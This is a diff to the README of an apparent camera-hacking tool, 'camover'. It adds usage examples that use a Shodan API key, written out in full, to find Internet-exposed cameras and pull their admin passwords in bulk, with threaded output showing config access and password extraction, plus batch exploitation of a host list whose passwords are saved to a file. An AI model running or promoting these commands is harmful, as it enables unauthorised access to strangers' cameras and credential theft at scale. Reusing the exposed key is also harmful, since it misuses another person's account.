@@ -41,7 +41,7 @@ optional arguments:
 Let's hack my camera just for fun.
 
 ```shell
-camover --address 192.168.99.100
+camover -a 192.168.99.100
 ```
 
 **output:**
@@ -53,10 +53,40 @@ camover --address 192.168.99.100
 [i] (192.168.99.100) - password: mamahacker123
 ```
 
-Let's try to use opened database of hosts with `--threads` for fast exploitation.
+Let's try to use Shodan search engine to exploit cameras over Internet, we will use it with `-t` for fast exploitation.
 
 ```shell
-camover --threads --input cameras.txt --output passwords.txt
+camover -t --api PSKINdQe1GyxGgecYz2191H2JoS9qvgD
+```
+
+**output:**
+
+```shell
+[*] Authorizing Shodan by given API key...
+[+] Authorization successfully completed!
+[*] Initializing thread #0...
+[*] (x.x.x.x) - connecting to camera...
+[*] Initializing thread #1...
+[*] (x.x.x.x) - connecting to camera...
+[*] Initializing thread #2...
+[*] (x.x.x.x) - connecting to camera...
+[*] (x.x.x.x) - accessing camera config...
+[*] (x.x.x.x) - extracting admin password...
+[i] Thread #0 completed.
+[*] (x.x.x.x) - connecting to camera...
+[*] (x.x.x.x) - accessing camera config...
+[*] (x.x.x.x) - extracting admin password...
+[i] Thread #1 completed.
+[*] (x.x.x.x) - connecting to camera...
+[*] (x.x.x.x) - accessing camera config...
+[*] (x.x.x.x) - extracting admin password...
+[i] Thread #2 completed.
+```
+
+Let's try to use opened database of hosts with `-t` for fast exploitation.
+
+```shell
+camover -t -i cameras.txt -o passwords.txt
 ```
 
 It will exploit all cameras in `cameras.txt` list by their addresses and save all obtained passwords to `passwords.txt`.
